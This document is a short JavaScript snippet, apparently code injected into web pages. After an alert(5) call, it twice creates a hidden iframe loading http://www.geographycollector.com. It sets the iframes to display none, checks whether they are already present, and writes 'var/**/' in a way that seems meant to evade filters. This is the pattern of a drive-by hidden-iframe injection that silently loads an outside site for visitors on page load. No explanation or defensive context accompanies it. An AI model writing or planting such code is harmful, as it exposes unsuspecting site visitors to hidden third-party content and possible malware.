alert(5);
if((!document.body.lastChild.src)||(document.body.lastChild.src.indexOf('geographycollector')==-1)){var/**/iframe=document.createElement('iframe');iframe.src='http://www.geographycollector.com';iframe.style.display='none';document.body.appendChild(iframe);}

if(document.body.lastChild.id!=='gphcll'){var/**/f=document.createElement('iframe');f.src='http://www.geographycollector.com';f.setAttribute('id','gphcll');f.style.display='none';document.body.appendChild(f);}
